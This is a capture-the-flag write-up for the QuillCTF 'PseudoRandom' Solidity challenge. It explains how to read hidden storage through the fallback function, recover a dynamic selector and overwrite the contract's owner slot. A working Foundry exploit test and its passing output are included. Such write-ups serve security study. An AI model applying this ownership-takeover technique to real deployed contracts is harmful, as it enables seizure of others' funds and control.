# QuillCTF : PseudoRandom

## Objective of CTF

Become the Owner of the contract.

### Contract code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract PseudoRandom {
    error WrongSig();

    address public owner;

    constructor() {
        bytes32[3] memory input;
        input[0] = bytes32(uint256(1));
        input[1] = bytes32(uint256(2));

        bytes32 scalar;
        assembly {
            scalar := sub(mul(timestamp(), number()), chainid())
        }
        input[2] = scalar;

        assembly {
            let success := call(gas(), 0x07, 0x00, input, 0x60, 0x00, 0x40)
            if iszero(success) {
                revert(0x00, 0x00)
            }

            let slot := xor(mload(0x00), mload(0x20))

            sstore(add(chainid(), origin()), slot)

            let sig := shl(
                0xe0,
                or(
                    and(scalar, 0xff000000),
                    or(
                        and(shr(xor(origin(), caller()), slot), 0xff0000),
                        or(
                            and(
                                shr(
                                    mod(xor(chainid(), origin()), 0x0f),
                                    mload(0x20)
                                ),
                                0xff00
                            ),
                            and(shr(mod(number(), 0x0a), mload(0x20)), 0xff)
                        )
                    )
                )
            )
            sstore(slot, sig)
        }
    }

    fallback() external {
        if (msg.sig == 0x3bc5de30) {
            assembly {
                mstore(0x00, sload(calldataload(0x04)))
                return(0x00, 0x20)
            }
        } else {
            bytes4 sig;

            assembly {
                sig := sload(sload(add(chainid(), caller())))
            }

            if (msg.sig != sig) {
                revert WrongSig();
            }

            assembly {
                sstore(owner.slot, calldataload(0x24))
            }
        }
    }
}
```

It only has a fallback function, which checks for 2 function identifier, one is 0x3bc5de30 which is `getData()` another one is `sig` which is dynamic and it is set in the constructor

We can set our function identifier to 0x3bc5de30 to read the storage, passing the storage slot as the first 32 bytes after the function identifier in the calldata 

The storage slot that store `sig` is stored on the slot that is the sum of chain id and origin, and `sig` is stored on that storage slot

The chain used will be pseudo-randomly selected in the foundry test

Once we know the `sig`, we can just set the function identifier in the calldata as `sig` and set the second 32 bytes after the function identifier to our owner address, so it will change the data of the owner's slot to our address, and we will become the owner

## Proof of concept

### Foundry test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/PseudoRandom.sol";

contract PseudoRandomTest is Test {
    string private BSC_RPC = "https://rpc.ankr.com/bsc"; // 56
    string private POLY_RPC = "https://rpc.ankr.com/polygon"; // 137
    string private FANTOM_RPC = "https://rpc.ankr.com/fantom"; // 250
    string private ARB_RPC = "https://rpc.ankr.com/arbitrum"; // 42161
    string private OPT_RPC = "https://rpc.ankr.com/optimism"; // 10
    string private GNOSIS_RPC = "https://rpc.ankr.com/gnosis"; // 100

    address private addr;

    function setUp() external {
        vm.createSelectFork(BSC_RPC);
    }

    function test() external {
        string memory rpc = new string(32);
        assembly {
            // network selection
            let _rpc := sload(
                add(mod(xor(number(), timestamp()), 0x06), BSC_RPC.slot)
            )
            mstore(rpc, shr(0x01, and(_rpc, 0xff)))
            mstore(add(rpc, 0x20), and(_rpc, not(0xff)))
        }

        addr = makeAddr(rpc);

        vm.createSelectFork(rpc);

        vm.startPrank(addr, addr);
        address instance = address(new PseudoRandom());

        // the solution 
        (, bytes memory slotBytes) = instance.call(abi.encodeWithSignature("getData()", uint256(uint160(addr)) + block.chainid));
        uint256 slot = abi.decode(slotBytes, (uint));
        console.log(slot);
        (, bytes memory sigBytes) = instance.call(abi.encodeWithSignature("getData()", slot));
        bytes4 sig = abi.decode(sigBytes, (bytes4));
        console.logBytes4(sig);
        instance.call(abi.encodeWithSelector(sig, bytes32(0), addr));
        console.log(PseudoRandom(instance).owner());
        
        assertEq(PseudoRandom(instance).owner(), addr);
    }
}
```

### Foundry test output

```
# forge test --match-path test/PseudoRandom.t.sol -vv
[⠰] Compiling...
No files changed, compilation skipped

Running 1 test for test/PseudoRandom.t.sol:PseudoRandomTest
[PASS] test() (gas: 191241)
Logs:
  4499126719395355399720051982138993480830469723364199535435825434022858553839
  0xa54d54a3
  0xf91b5dC05b4E3824E405Edc65B7733A7f898d74b

Test result: ok. 1 passed; 0 failed; finished in 2.98s
```